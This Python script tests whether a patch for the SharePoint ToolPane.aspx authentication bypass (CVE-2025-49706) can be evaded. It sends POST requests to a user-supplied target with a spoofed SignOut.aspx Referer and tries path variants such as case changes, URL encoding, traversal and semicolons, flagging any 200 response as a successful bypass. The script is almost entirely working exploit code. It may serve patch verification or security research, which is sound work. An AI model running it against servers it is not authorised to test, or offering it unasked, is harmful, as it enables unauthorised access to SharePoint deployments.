#!/usr/bin/env python3
"""
Test bypasses for the ToolPane.aspx authentication patch

The patch detects:
- flag8: Referer is signout page (signoutPathRoot, signoutPathPrevious, signoutPathCurrent)
- flag10: Path ends with "ToolPane.aspx" (case-insensitive)
- If BOTH true → Block

Potential bypasses:
1. Different signout-like paths
2. Case variations of ToolPane.aspx
3. Path traversal in ToolPane.aspx
4. Alternative /_layouts/ pages that also have signout bypass
5. Other paths that start with signoutPath but target different endpoints
"""

import requests
import argparse

def test_bypass(url, endpoint, referer="", description=""):
    """Test a specific bypass attempt"""
    print(f"\n[*] Test: {description}")
    print(f"    Endpoint: {endpoint}")
    print(f"    Referer: {referer}")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    }
    if referer:
        headers["Referer"] = referer

    try:
        response = requests.post(f"{url}{endpoint}", headers=headers, data="", allow_redirects=False, timeout=10)
        print(f"    Status: {response.status_code}")

        if response.status_code == 200:
            print(f"    [+] BYPASS SUCCESSFUL! 200 OK")
            return True
        elif response.status_code == 401:
            print(f"    [-] Blocked: 401 Unauthorized")
        elif response.status_code == 403:
            print(f"    [-] Blocked: 403 Forbidden")
        else:
            print(f"    [?] {response.status_code}")

        return False
    except Exception as e:
        print(f"    [!] Error: {str(e)[:80]}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test ToolPane.aspx patch bypasses")
    parser.add_argument("--url", required=True, help="Target URL")
    args = parser.parse_args()

    target_url = args.url.rstrip('/')

    print("[*] Testing Patch Bypass Attempts for CVE-2025-49706")
    print("=" * 70)

    # Baseline: Original exploit (should be blocked)
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
               referer="/_layouts/SignOut.aspx",
               description="Baseline: Original exploit (should be BLOCKED)")

    # Test 1: Case variations of ToolPane.aspx
    test_bypass(target_url, "/_layouts/15/TOOLPANE.ASPX?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Case variation: TOOLPANE.ASPX")

    test_bypass(target_url, "/_layouts/15/toolpane.aspx?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Case variation: toolpane.aspx (lowercase)")

    # Test 2: Path with trailing characters after .aspx
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx/extra?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Trailing path: ToolPane.aspx/extra")

    # Test 3: Double extension
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx.bak?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Double extension: ToolPane.aspx.bak")

    # Test 4: URL-encoded variations
    test_bypass(target_url, "/_layouts/15/ToolPane%2Easpx?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="URL-encoded dot: ToolPane%2Easpx")

    # Test 5: Different signout paths
    signout_variants = [
        "/_layouts/14/SignOut.aspx",
        "/_layouts/SignOut.aspx",
        "/_layouts/signout.aspx",
        "/_layouts/15/signout.aspx",
        "/signout",
        "/_layouts/15/SignOut",
    ]

    for referer_var in signout_variants:
        test_bypass(target_url, "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                   referer=referer_var,
                   description=f"Signout variant Referer: {referer_var}")

    # Test 6: Other /_layouts/ pages with signout Referer
    other_pages = [
        "/_layouts/15/start.aspx",
        "/_layouts/15/settings.aspx",
        "/_layouts/15/viewlsts.aspx",
        "/_layouts/15/Picker.aspx",
    ]

    for page in other_pages:
        test_bypass(target_url, page,
                   referer="/_layouts/SignOut.aspx",
                   description=f"Alternative page with signout Referer: {page}")

    # Test 7: ToolPane.aspx without signout Referer
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
               referer="/_layouts/15/start.aspx",
               description="ToolPane.aspx with start.aspx Referer")

    test_bypass(target_url, "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
               referer="",
               description="ToolPane.aspx with NO Referer")

    # Test 8: Path traversal attempts
    test_bypass(target_url, "/_layouts/15/../15/ToolPane.aspx?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Path traversal: /../15/ToolPane.aspx")

    test_bypass(target_url, "/_layouts/15/./ToolPane.aspx?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Path traversal: /./ToolPane.aspx")

    # Test 9: Query parameter in path
    test_bypass(target_url, "/_layouts/15/ToolPane.aspx;test?DisplayMode=Edit",
               referer="/_layouts/SignOut.aspx",
               description="Semicolon in path: ToolPane.aspx;test")

    print("\n[*] All patch bypass tests completed")
    print("[*] If any returned 200 OK, a bypass exists!")

if __name__ == "__main__":
    main()
